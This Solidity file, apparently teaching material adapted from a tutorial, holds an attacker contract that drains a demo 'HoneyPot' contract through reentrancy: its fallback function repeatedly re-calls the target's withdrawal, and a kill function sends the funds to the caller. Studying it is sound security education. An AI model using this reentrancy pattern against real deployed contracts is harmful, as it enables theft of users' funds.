/**
    Credits to Gustavo Guimaraes
    https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
    accessed: 2019-01-05

    edited to satisfy solium linter by Daniel Hohner
 */

pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract HoneyPotCollect {

    // instanciate honeypot contract to enable communication with HoneyPot-Contract

    HoneyPot public honeypot;

    function HoneyPotCollect (address _honeypot) public {
        honeypot = HoneyPot(_honeypot);
    }


    function kill () public {
        suicide(msg.sender);
    }

    // put small amount of wei into honeypot contract to enable reentrance draining

    function collect() public payable {
        honeypot.put.value(msg.value)();
        honeypot.get();
    }

    // fallback function - gets called by msg.sender.call.value(balances[msg.sender])()
    // drains HoneyPot contract

    function () public payable {
        if (honeypot.balance >= msg.value) {
            honeypot.get();
        }
    }
}